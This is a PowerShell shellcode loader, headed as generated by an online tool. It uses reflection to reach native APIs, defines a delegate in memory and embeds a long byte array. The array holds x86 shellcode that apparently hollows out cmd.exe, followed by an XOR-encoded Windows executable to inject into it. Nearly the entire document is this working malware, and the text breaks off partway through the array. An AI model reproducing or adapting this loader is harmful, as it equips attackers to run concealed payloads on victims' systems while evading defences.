# generated by i.hacking8.com
Set-StrictMode -Version 2

$DoIt = @'
function func_b {
	Param ($amodule, $aprocedure)		
	$aunsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.Uns'+'afeN'+'ativeMethods')
	$agpa = $aunsafe_native_methods.GetMethod('GetP'+'rocAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
	return $agpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($aunsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($amodule)))), $aprocedure))
}

function func_a {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $aparameters,
		[Parameter(Position = 1)] [Type] $areturn_type = [Void]
	)

	$atype_b = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('Reflect'+'edDel'+'egate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDeleg'+'ateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$atype_b.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $aparameters).SetImplementationFlags('Runtime, Managed')
	$atype_b.DefineMethod('Inv'+'oke', 'Public, HideBySig, NewSlot, Virtual', $areturn_type, $aparameters).SetImplementationFlags('Runtime, Managed')

	return $atype_b.CreateType()
}

[Byte[]]$acode =  [Byte[]](233,0,0,0,0,85,139,236,129,236,12,1,0,0,141,141,56,255,255,255,232,58,5,0,0,198,69,164,72,198,69,165,101,198,69,166,108,198,69,167,108,198,69,168,111,198,69,169,0,198,69,152,74,198,69,153,117,198,69,154,115,198,69,155,116,198,69,156,32,198,69,157,97,198,69,158,32,198,69,159,116,198,69,160,101,198,69,161,115,198,69,162,116,198,69,163,0,232,0,0,0,0,88,137,133,124,255,255,255,139,133,124,255,255,255,137,69,148,131,101,252,0,131,101,228,0,235,7,139,69,228,64,137,69,228,129,125,228,255,255,255,0,125,56,139,69,148,3,69,228,137,69,188,139,69,188,15,190,0,131,248,17,117,9,139,69,252,64,137,69,252,235,4,131,101,252,0,131,125,252,10,124,15,139,69,188,137,69,148,139,69,188,64,137,69,184,235,2,235,184,131,125,184,0,117,5,233,139,2,0,0,139,69,184,137,69,236,199,69,144,17,0,0,0,131,101,224,0,235,7,139,69,224,64,137,69,224,129,125,224,255,255,255,0,125,117,139,69,184,3,69,224,137,69,244,139,69,244,15,190,0,131,248,68,117,9,139,69,252,64,137,69,252,235,4,131,101,252,0,131,125,252,30,124,59,139,69,244,43,69,252,137,133,120,255,255,255,139,69,252,137,69,240,235,7,139,69,240,72,137,69,240,131,125,240,0,127,22,139,69,244,43,69,240,15,190,0,51,69,144,139,77,244,43,77,240,136,1,235,221,235,21,235,14,139,69,244,15,190,0,51,69,144,139,77,244,136,1,233,123,255,255,255,198,69,192,67,198,69,193,58,198,69,194,92,198,69,195,87,198,69,196,105,198,69,197,110,198,69,198,100,198,69,199,111,198,69,200,119,198,69,201,115,198,69,202,92,198,69,203,83,198,69,204,121,198,69,205,115,198,69,206,116,198,69,207,101,198,69,208,109,198,69,209,51,198,69,210,50,198,69,211,92,198,69,212,99,198,69,213,109,198,69,214,100,198,69,215,46,198,69,216,101,198,69,217,120,198,69,218,101,198,69,219,0,139,69,236,137,69,180,139,69,180,15,183,0,61,77,90,0,0,116,5,233,107,1,0,0,139,69,180,139,77,236,3,72,60,137,77,248,139,69,248,129,56,80,69,0,0,15,133,80,1,0,0,106,0,106,16,90,141,77,128,232,30,3,0,0,89,106,0,106,68,90,141,141,244,254,255,255,232,13,3,0,0,89,141,69,128,80,141,133,244,254,255,255,80,106,0,106,0,106,4,106,0,106,0,106,0,106,0,141,69,192,80,255,149,92,255,255,255,133,192,15,132,6,1,0,0,106,4,104,0,16,0,0,106,4,106,0,255,149,96,255,255,255,137,69,232,139,69,232,199,0,7,0,1,0,255,117,232,255,117,132,255,149,100,255,255,255,133,192,15,132,213,0,0,0,106,64,104,0,48,0,0,139,69,248,255,112,80,139,69,248,255,112,52,255,117,128,255,149,104,255,255,255,137,69,172,106,0,139,69,248,255,112,84,255,117,236,255,117,172,255,117,128,255,149,108,255,255,255,131,101,220,0,235,7,139,69,220,64,137,69,220,139,69,248,15,183,64,6,57,69,220,125,62,139,69,180,139,77,236,3,72,60,107,69,220,40,141,132,1,248,0,0,0,137,69,176,106,0,139,69,176,255,112,16,139,69,176,139,77,236,3,72,20,81,139,69,176,139,77,172,3,72,12,81,255,117,128,255,149,108,255,255,255,235,175,106,0,106,4,139,69,248,131,192,52,80,139,69,232,139,128,164,0,0,0,131,192,8,80,255,117,128,255,149,108,255,255,255,139,69,248,139,77,172,3,72,40,139,69,232,137,136,176,0,0,0,255,117,232,255,117,132,255,149,112,255,255,255,255,117,132,255,149,116,255,255,255,201,195,85,139,236,129,236,168,0,0,0,100,161,48,0,0,0,83,86,51,246,137,77,232,139,64,12,87,199,69,216,46,0,68,0,199,69,220,76,0,76,0,139,72,12,137,117,224,233,196,0,0,0,139,65,48,139,254,139,89,44,139,9,137,69,240,139,66,60,106,0,137,77,236,139,116,16,120,139,68,16,124,137,69,228,139,198,137,117,248,94,133,192,15,132,150,0,0,0,193,235,16,137,93,252,139,222,57,117,252,118,50,139,77,252,139,85,240,15,190,52,26,193,207,13,128,60,26,97,137,117,252,124,9,139,198,131,192,224,3,248,235,3,3,125,252,67,59,217,114,223,139,85,244,51,246,139,77,236,139,69,248,141,28,16,137,117,252,139,67,32,3,194,137,93,240,131,123,24,0,137,69,244,118,64,139,69,244,137,117,248,139,24,3,218,131,192,4,137,69,244,138,11,193,206,13,15,190,193,3,240,67,132,201,117,241,139,93,240,137,117,248,51,246,139,69,248,3,199,59,69,232,116,36,139,69,252,64,137,69,252,59,67,24,114,195,139,77,236,139,81,24,137,85,244,133,210,15,133,46,255,255,255,51,192,95,94,91,201,195,139,77,252,139,67,36,141,4,72,15,183,12,16,139,67,28,141,4,136,139,12,16,3,202,59,203,15,130,166,0,0,0,139,69,228,3,195,59,200,15,135,153,0,0,0,138,1,139,214,235,14,102,152,102,137,132,85,88,255,255,255,66,138,4,10,60,46,117,238,141,89,1,139,254,3,218,138,11,193,207,13,15,190,193,3,248,67,132,201,117,241,106,46,139,198,89,102,137,140,85,88,255,255,255,66,15,183,76,69,218,64,102,133,201,117,236,51,192,141,28,85,2,0,0,0,102,137,132,85,88,255,255,255,139,206,133,219,116,27,138,132,13,88,255,255,255,193,206,13,15,190,208,60,97,124,3,131,198,224,3,242,65,59,203,114,229,185,76,119,214,7,232,68,254,255,255,141,141,88,255,255,255,81,255,208,141,12,55,232,51,254,255,255,233,53,255,255,255,139,193,233,46,255,255,255,85,139,236,139,193,133,210,116,13,83,138,93,8,136,24,64,131,234,1,117,248,91,139,193,93,195,85,139,236,131,236,12,86,139,241,185,76,119,38,7,232,250,253,255,255,141,77,244,137,6,81,199,69,244,117,115,101,114,199,69,248,51,50,46,100,102,199,69,252,108,108,198,69,254,0,255,208,185,69,131,86,7,232,208,253,255,255,185,49,139,111,135,137,70,4,232,195,253,255,255,185,218,246,218,79,137,70,8,232,182,253,255,255,185,45,87,174,91,137,70,12,232,169,253,255,255,185,198,150,135,82,137,70,16,232,156,253,255,255,185,219,62,144,84,137,70,20,232,143,253,255,255,185,81,87,36,248,137,70,28,232,130,253,255,255,185,243,156,95,195,137,70,24,232,117,253,255,255,185,121,204,63,134,137,70,32,232,104,253,255,255,185,88,164,83,229,137,70,36,232,91,253,255,255,185,24,92,66,209,137,70,40,232,78,253,255,255,185,174,135,146,63,137,70,44,232,65,253,255,255,185,197,216,189,231,137,70,48,232,52,253,255,255,185,24,92,78,209,137,70,52,232,39,253,255,255,185,43,9,244,142,137,70,56,232,26,253,255,255,137,70,60,94,201,195,17,17,17,17,17,17,17,17,17,17,92,75,129,17,18,17,17,17,21,17,17,17,238,238,17,17,169,17,17,17,17,17,17,17,81,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,249,17,17,17,31,14,171,31,17,165,24,220,48,169,16,93,220,48,69,121,120,98,49,97,99,126,118,99,112,124,49,114,112,127,127,126,101,49,115,116,49,99,100,127,49,120,127,49,85,94,66,49,124,126,117,116,63,28,28,27,53,17,17,17,17,17,17,17,238,72,195,74,170,41,173,25,170,41,173,25,170,41,173,25,41,53,163,25,168,41,173,25,197,54,167,25,161,41,173,25,197,54,166,25,171,41,173,25,197,54,169,25,174,41,173,25,170,41,172,25,144,41,173,25,105,38,240,25,173,41,173,25,66,54,166,25,169,41,173,25,67,120,114,121,170,41,173,25,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,65,84,17,17,93,16,18,17,86,38,49,114,17,17,17,17,17,17,17,17,241,17,30,16,26,16,23,17,17,29,17,17,17,31,17,17,17,17,17,17,145,8,17,17,17,1,17,17,17,49,17,17,17,17,81,17,17,1,17,17,17,19,17,17,21,17,17,17,17,17,17,17,21,17,17,17,17,17,17,17,17,81,17,17,17,21,17,17,17,17,17,17,19,17,17,17,17,17,1,17,17,1,17,17,17,17,1,17,17,1,17,17,17,17,17,17,1,17,17,17,17,17,17,17,17,17,17,17,81,48,17,17,105,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,49,17,17,237,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,63,101,116,105,101,17,17,17,244,27,17,17,17,1,17,17,17,29,17,17,17,21,17,17,17,17,17,17,17,17,17,17,17,17,17,17,49,17,17,113,63,99,117,112,101,112,17,17,29,23,17,17,17,49,17,17,17,25,17,17,17,1,17,17,17,17,17,17,17,17,17,17,17,17,17,17,81,17,17,81,63,117,112,101,112,17,17,17,213,21,17,17,17,33,17,17,17,23,17,17,17,9,17,17,17,17,17,17,17,17,17,17,17,17,17,17,81,17,17,209,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,68,154,253,249,22,17,17,17,249,3,17,17,17,76,210,68,154,253,168,180,37,81,17,238,4,121,49,81,17,76,210,68,154,253,121,32,1,81,17,249,254,25,17,17,146,213,21,76,210,68,154,253,168,180,37,81,17,238,4,117,49,81,17,76,210,68,154,253,249,22,17,17,17,249,3,17,17,17,76,210,68,154,253,168,181,37,81,17,238,4,113,49,81,17,76,210,68,154,253,121,99,1,81,17,249,191,25,17,17,146,213,21,76,210,68,154,253,168,181,37,81,17,238,4,125,49,81,17,76,210,68,154,253,144,253,137,16,17,17,152,156,121,239,238,238,154,148,121,239,238,238,214,17,17,48,81,17,156,156,97,239,238,238,64,121,19,19,17,17,238,4,245,49,81,17,152,148,125,239,238,238,123,17,123,17,123,16,123,17,238,4,17,49,81,17,154,132,121,239,238,238,152,83,29,154,148,121,239,238,238,214,81,25,238,238,238,238,154,156,121,239,238,238,214,144,61,202,21,17,17,17,17,17,154,132,121,239,238,238,214,83,21,17,17,17,17,121,9,202,21,17,123,17,154,148,121,239,238,238,20,33,202,21,17,65,249,49,25,17,17,146,213,29,154,148,121,239,238,238,154,244,76,210,68,154,253,64,152,92,237,154,84,237,214,17,17,48,81,17,154,92,237,146,104,25,238,101,28,154,68,237,154,83,25,65,238,4,205,49,81,17,154,92,237,154,64,29,67,238,4,21,49,81,17,238,4,241,49,81,17,154,244,76,210,68,154,253,146,253,25,152,92,233,214,84,237,17,17,17,17,176,49,32,81,17,65,121,49,33,81,17,154,92,233,249,27,17,17,17,152,84,237,154,84,237,154,244,76,210,68,154,253,146,253,49,152,92,241,214,84,237,16,17,17,17,123,23,123,16,123,19,238,4,225,49,81,17,154,92,241,152,80,25,154,68,241,146,107,25,238,100,22,34,209,248,211,17,17,17,214,84,233,17,17,17,17,146,108,237,17,30,149,189,17,17,17,214,84,229,17,17,17,17,250,24,154,84,229,146,209,16,152,84,229,146,108,229,21,30,156,154,17,17,17,154,92,25,64,238,4,197,49,81,17,152,84,233,119,214,84,245,19,17,119,154,68,29,67,238,4,229,49,81,17,119,152,84,247,154,84,233,154,89,29,154,0,154,19,152,84,249,123,1,156,92,245,64,154,68,241,154,83,25,65,238,4,253,49,81,17,146,233,238,100,48,154,92,241,154,64,29,67,238,4,1,49,81,17,121,249,18,17,17,154,84,241,154,89,29,64,238,4,29,49,81,17,250,15,123,17,123,17,154,68,241,67,121,110,3,81,17,123,17,123,17,238,4,25,49,81,17,169,16,17,17,17,250,30,248,115,238,238,238,248,91,238,238,238,169,16,17,17,17,154,244,76,211,25,17,68,154,253,169,25,1,17,17,249,165,23,17,17,70,154,84,25,152,148,233,254,238,238,215,148,237,254,238,238,17,168,238,18,17,17,34,209,156,172,236,254,238,238,226,186,119,186,187,214,84,237,17,17,17,17,154,156,233,254,238,238,146,104,25,238,101,105,154,132,233,254,238,238,146,107,25,238,100,19,250,123,123,17,121,17,1,17,17,156,148,237,254,238,238,65,154,156,233,254,238,238,154,64,25,67,238,4,201,49,81,17,152,84,237,146,108,237,17,110,19,250,80,154,84,237,65,156,156,237,254,238,238,64,154,132,233,254,238,238,154,83,21,154,156,233,254,238,238,156,69,16,1,67,249,6,23,17,17,146,213,29,154,148,233,254,238,238,154,89,21,18,92,237,154,132,233,254,238,238,152,91,21,248,109,238,238,238,121,9,202,21,17,154,148,233,254,238,238,146,209,1,65,154,156,233,254,238,238,144,208,33,202,21,17,64,249,200,20,17,17,146,213,29,121,29,18,17,17,121,49,33,81,17,154,132,233,254,238,238,144,211,41,162,24,17,67,249,171,20,17,17,146,213,29,123,17,238,4,9,49,81,17,238,4,5,49,81,17,148,209,101,7,238,4,5,49,81,17,65,123,104,121,61,34,81,17,249,150,18,17,17,146,213,29,154,148,233,254,238,238,214,145,61,202,21,17,16,17,17,17,154,84,237,78,154,244,76,211,21,17,68,154,253,146,253,29,152,92,229,123,81,121,17,33,17,17,121,9,202,21,17,123,17,238,4,13,49,81,17,152,84,233,146,108,233,17,100,50,238,4,5,49,81,17,148,209,101,8,238,4,5,49,81,17,65,121,149,17,17,17,121,117,34,81,17,249,53,18,17,17,146,213,29,121,9,202,21,17,154,84,229,20,33,202,21,17,65,154,92,233,64,249,4,20,17,17,146,213,29,123,17,123,17,154,68,233,67,154,84,233,65,123,17,123,17,238,4,25,49,81,17,152,84,237,146,108,237,17,102,50,238,4,5,49,81,17,148,209,101,8,238,4,5,49,81,17,65,121,155,17,17,17,121,141,34,81,17,249,217,19,17,17,146,213,29,169,16,17,17,17,154,244,76,210,68,154,253,146,253,25,152,92,233,123,17,154,84,29,65,154,92,25,64,154,68,233,154,83,25,65,238,4,249,49,81,17,152,84,237,146,108,237,17,110,21,34,209,250,20,169,16,17,17,17,154,244,76,211,25,17,221,221,221,221,221,221,221,221,221,221,221,68,154,253,64,152,92,237,154,92,237,249,77,237,238,238,154,84,25,146,241,16,148,209,101,29,154,92,237,64,249,3,21,17,17,146,213,21,154,84,237,154,244,76,211,21,17,221,221,68,154,253,123,238,121,202,11,81,17,117,176,17,17,17,17,65,117,152,52,17,17,17,17,146,253,13,176,197,34,81,17,152,84,245,154,28,201,34,81,17,152,92,249,119,154,4,205,34,81,17,119,152,68,253,121,89,167,24,17,249,94,21,17,17,146,213,21,152,84,205,214,84,237,17,17,17,17,146,108,205,17,101,28,154,92,205,249,87,234,238,238,152,84,201,250,22,214,84,201,17,17,17,17,154,84,201,152,84,241,214,84,237,238,238,238,238,154,92,241,152,92,225,154,92,225,249,228,234,238,238,148,209,101,31,123,27,156,68,245,67,154,92,225,249,233,239,238,238,154,84,225,146,169,61,202,21,17,17,100,27,123,117,238,4,49,49,81,17,250,251,154,92,225,146,168,61,202,21,17,17,101,25,154,92,225,249,49,239,238,238,123,238,238,4,49,49,81,17,34,209,154,92,229,117,152,28,17,17,17,17,154,244,76,210,221,221,221,221,221,221,221,221,221,68,154,253,144,253,77,25,17,17,214,148,185,230,238,238,238,238,238,238,121,17,25,17,17,156,148,237,230,238,238,65,121,241,34,81,17,238,4,85,49,81,17,121,21,37,81,17,156,156,237,230,238,238,64,238,4,81,49,81,17,123,17,156,132,237,230,238,238,67,238,4,45,49,81,17,123,23,156,148,237,230,238,238,65,238,4,41,49,81,17,121,1,37,81,17,156,156,237,230,238,238,64,238,4,81,49,81,17,123,17,123,19,123,21,123,17,123,16,121,17,17,17,81,156,132,237,230,238,238,67,238,4,37,49,81,17,152,148,185,230,238,238,123,19,123,17,123,17,154,148,185,230,238,238,65,238,4,33,49,81,17,156,156,189,230,238,238,64,238,4,61,49,81,17,154,132,169,230,238,238,144,243,238,238,17,17,67,154,148,167,230,238,238,52,238,238,17,17,65,154,156,165,230,238,238,144,240,238,238,17,17,64,154,132,163,230,238,238,144,243,238,238,17,17,67,154,148,191,230,238,238,52,238,238,17,17,65,154,156,189,230,238,238,144,240,238,238,17,17,64,121,53,37,81,17,156,132,173,230,238,238,67,238,4,217,49,81,17,146,213,49,152,148,181,230,238,238,123,17,156,148,181,230,238,238,65,154,156,181,230,238,238,192,240,64,156,132,173,230,238,238,67,154,148,185,230,238,238,65,238,4,57,49,81,17,154,92,25,64,238,4,53,49,81,17,152,84,237,123,17,156,68,237,67,154,84,237,192,241,65,154,92,25,64,154,132,185,230,238,238,67,238,4,57,49,81,17,154,244,76,210,68,154,253,144,253,1,23,17,17,238,4,5,49,81,17,152,84,229,146,108,1,17,100,23,154,84,229,152,84,1,154,92,25,64,238,4,65,49,81,17,146,249,16,152,84,233,250,24,154,68,233,146,251,16,152,68,233,146,108,233,17,111,14,154,84,25,18,84,233,30,175,25,146,232,77,100,30,154,68,233,154,84,25,156,93,1,16,152,92,25,250,19,250,195,123,17,121,17,19,17,17,156,132,225,232,238,238,67,123,17,154,84,1,65,123,17,121,17,1,17,17,238,4,93,49,81,17,152,84,237,146,108,237,17,100,3,121,97,37,81,17,156,156,225,232,238,238,64,238,4,89,49,81,17,214,84,225,17,17,17,17,250,24,154,68,233,146,211,16,152,68,233,154,84,225,42,84,237,108,62,154,92,225,30,175,133,28,225,232,238,238,146,235,28,101,1,154,84,225,30,175,157,20,225,232,238,238,146,232,27,100,28,154,68,225,215,149,4,225,232,238,238,17,250,19,250,209,156,148,225,232,238,238,65,154,92,1,64,154,68,29,67,154,84,25,65,121,101,37,81,17,156,156,225,234,238,238,64,238,4,221,49,81,17,146,213,9,152,84,237,156,132,225,234,238,238,67,249,49,17,17,17,146,213,21,156,148,225,234,238,238,65,249,146,17,17,17,146,213,21,154,92,229,64,238,4,9,49,81,17,154,244,76,210,68,154,253,146,253,1,154,84,25,65,238,4,65,49,81,17,152,84,237,154,92,237,156,69,24,19,67,249,252,17,17,17,146,213,21,152,84,229,154,84,229,152,84,233,154,92,237,146,208,16,64,154,68,233,67,154,84,237,146,209,16,65,154,92,25,64,123,17,123,17,238,4,69,49,81,17,148,209,101,29,154,68,233,67,249,21,236,238,238,146,213,21,154,84,233,152,84,225,154,92,225,64,249,7,17,17,17,146,213,21,154,244,76,210,68,154,253,154,84,25,65,238,4,73,49,81,17,76,210,238,101,53,21,249,178,16,17,17,72,210,146,44,209,37,81,17,238,100,29,238,101,53,21,238,4,173,49,81,17,72,210,121,173,37,81,17,121,209,37,81,17,238,101,53,29,249,110,16,17,17,146,213,29,210,238,101,53,21,249,218,238,238,238,230,201,10,209,72,230,201,89,210,221,238,52,181,49,81,17,238,52,185,49,81,17,221,221,221,221,221,221,64,44,17,1,17,17,156,93,53,25,99,5,144,248,17,1,17,17,60,17,1,17,17,148,16,44,17,1,17,17,98,253,58,217,154,213,148,16,154,240,154,25,154,81,21,65,210,221,238,52,189,49,81,17,238,52,161,49,81,17,221,221,221,221,68,154,253,123,238,121,25,48,81,17,121,175,11,81,17,117,176,17,17,17,17,65,117,152,52,17,17,17,17,146,253,49,66,71,70,152,116,249,146,116,237,17,123,16,238,4,137,49,81,17,72,146,28,173,37,81,17,238,146,28,209,37,81,17,238,238,4,133,49,81,17,154,28,165,37,81,17,152,25,238,4,145,49,81,17,154,28,161,37,81,17,152,25,176,101,49,81,17,154,17,178,169,37,81,17,249,222,17,17,17,146,44,177,37,81,17,17,100,29,121,171,11,81,17,238,4,105,49,81,17,72,249,177,17,17,17,121,5,33,81,17,121,1,33,81,17,249,154,17,17,17,176,189,37,81,17,152,84,201,156,84,201,65,238,36,185,37,81,17,156,84,241,65,156,84,197,65,156,84,245,65,238,4,149,49,81,17,121,29,33,81,17,121,17,33,81,17,249,73,17,17,17,238,4,153,49,81,17,154,92,241,152,25,238,100,241,238,100,197,238,100,245,249,108,235,238,238,146,213,33,152,84,205,65,238,4,157,49,81,17,154,84,253,154,25,154,24,152,92,193,65,64,249,10,17,17,17,72,72,210,154,116,249,238,100,193,238,4,209,49,81,17,238,52,165,49,81,17,238,52,169,49,81,17,238,52,129,49,81,17,238,52,177,49,81,17,121,17,17,18,17,121,17,17,16,17,249,28,17,17,17,72,72,210,34,209,210,210,238,52,141,49,81,17,238,52,109,49,81,17,221,221,221,221,221,221,154,84,205,65,249,26,239,238,238,72,210,169,9,48,81,17,248,128,239,238,238,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,165,51,17,17,213,51,17,17,195,51,17,17,243,51,17,17,233,51,17,17,23,50,17,17,7,50,17,17,55,50,17,17,39,50,17,17,47,50,17,17,91,50,17,17,71,50,17,17,119,50,17,17,105,50,17,17,151,50,17,17,141,50,17,17,161,50,17,17,173,50,17,17,201,50,17,17,245,50,17,17,231,50,17,17,19,53,17,17,9,53,17,17,17,17,17,17,189,53,17,17,157,53,17,17,125,53,17,17,213,53,17,17,17,17,17,17,187,52,17,17,135,52,17,17,239,52,17,17,171,52,17,17,107,52,17,17,123,52,17,17,115,52,17,17,69,52,17,17,219,52,17,17,201,52,17,17,251,52,17,17,155,52,17,17,249,53,17,17,227,53,17,17,237,53,17,17,29,52,17,17,49,52,17,17,57,52,17,17,39,52,17,17,93,52,17,17,17,17,17,17,45,53,17,17,89,53,17,17,17,17,17,17,37,17,17,145,1,17,17,145,18,17,17,145,101,17,17,145,98,17,17,145,2,17,17,145,21,17,17,145,6,17,17,145,24,17,17,145,17,17,17,17,17,17,17,17,161,5,81,17,17,17,17,17,238,238,238,238,97,11,81,17,149,11,81,17,17,17,17,17,49,20,130,8,16,17,17,17,41,48,81,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,238,238,238,238,193,11,81,17,169,48,17,17,17,17,17,17,17,17,17,17,63,53,17,17,17,49,17,17,145,51,17,17,17,17,17,17,17,17,17,17,69,53,17,17,217,49,17,17,157,51,17,17,17,17,17,17,17,17,17,17,113,53,17,17,197,49,17,17,9,51,17,17,17,17,17,17,17,17,17,17,205,53,17,17,113,49,17,17,61,51,17,17,17,17,17,17,17,17,17,17,81,52,17,17,101,49,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,165,51,17,17,213,51,17,17,195,51,17,17,243,51,17,17,233,51,17,17,23,50,17,17,7,50,17,17,55,50,17,17,39,50,17,17,47,50,17,17,91,50,17,17,71,50,17,17,119,50,17,17,105,50,17,17,151,50,17,17,141,50,17,17,161,50,17,17,173,50,17,17,201,50,17,17,245,50,17,17,231,50,17,17,19,53,17,17,9,53,17,17,17,17,17,17,189,53,17,17,157,53,17,17,125,53,17,17,213,53,17,17,17,17,17,17,187,52,17,17,135,52,17,17,239,52,17,17,171,52,17,17,107,52,17,17,123,52,17,17,115,52,17,17,69,52,17,17,219,52,17,17,201,52,17,17,251,52,17,17,155,52,17,17,249,53,17,17,227,53,17,17,237,53,17,17,29,52,17,17,49,52,17,17,57,52,17,17,39,52,17,17,93,52,17,17,17,17,17,17,45,53,17,17,89,53,17,17,17,17,17,17,37,17,17,145,1,17,17,145,18,17,17,145,101,17,17,145,98,17,17,145,2,17,17,145,21,17,17,145,6,17,17,145,24,17,17,145,17,17,17,17,94,17,82,99,116,112,101,116,84,103,116,127,101,80,17,17,37,17,82,125,126,98,116,89,112,127,117,125,116,17,126,17,82,99,116,112,101,116,69,121,99,116,112,117,17,17,129,18,70,112,120,101,87,126,99,66,120,127,118,125,116,94,115,123,116,114,101,17,222,19,67,116,98,116,101,84,103,116,127,101,17,17,96,16,86,116,101,93,112,98,101,84,99,99,126,99,17,17,57,18,66,116,101,93,112,98,101,84,99,99,126,99,17,17,144,18,71,120,99,101,100,112,125,80,125,125,126,114,17,17,71,18,66,125,116,116,97,17,220,18,125,98,101,99,125,116,127,70,17,17,181,18,70,99,120,101,116,87,120,125,116,17,98,16,86,116,101,93,126,114,112,125,69,120,124,116,17,17,10,18,66,116,101,87,120,125,116,65,126,120,127,101,116,99,17,17,71,17,82,99,116,112,101,116,87,120,125,116,70,17,11,18,66,116,101,87,120,125,116,80,101,101,99,120,115,100,101,116,98,70,17,17,95,17,82,99,116,112,101,116,85,120,99,116,114,101,126,99,104,70,17,17,175,18,125,98,101,99,114,112,101,70,17,17,172,17,84,105,97,112,127,117,84,127,103,120,99,126,127,124,116,127,101,66,101,99,120,127,118,98,70,17,215,18,125,98,101,99,114,97,104,80,17,17,226,17,87,126,99,124,112,101,92,116,98,98,112,118,116,80,17,17,221,18,125,98,101,99,125,116,127,80,17,17,100,19,92,100,125,101,120,83,104,101,116,69,126,70,120,117,116,82,121,112,99,17,156,19,94,100,101,97,100,101,85,116,115,100,118,66,101,99,120,127,118,80,17,17,90,84,67,95,84,93,34,35,63,117,125,125,17,17,201,19,102,98,97,99,120,127,101,119,70,17,198,19,102,98,97,99,120,127,101,119,80,17,68,66,84,67,34,35,63,117,125,125,17,17,70,66,35,78,34,35,63,117,125,125,17,17,143,17,46,46,33,88,127,120,101,81,120,126,98,78,115,112,98,116,81,98,101,117,81,81,64,80,84,81,73,75,17,17,24,16,46,46,32,88,127,120,101,81,120,126,98,78,115,112,98,116,81,98,101,117,81,81,64,80,84,81,73,75,17,17,180,17,46,46,33,78,70,120,127,120,101,81,98,101,117,81,81,64,80,84,81,73,75,17,28,16,46,46,32,78,70,120,127,120,101,81,98,101,117,81,81,64,80,84,81,73,75,17,92,66,71,82,65,39,33,63,117,125,125,17,136,19,124,116,124,98,116,101,17,17,134,19,124,116,124,114,97,104,17,17,30,17,46,46,35,81,72,80,65,80,73,88,81,75,17,17,88,17,78,78,82,105,105,87,99,112,124,116,89,112,127,117,125,116,99,17,79,19,119,99,116,116,17,17,68,17,78,78,117,125,125,126,127,116,105,120,101,17,151,16,78,126,127,116,105,120,101,17,92,66,71,82,67,69,63,117,125,125,17,17,194,17,78,116,105,120,101,17,89,17,78,73,114,97,101,87,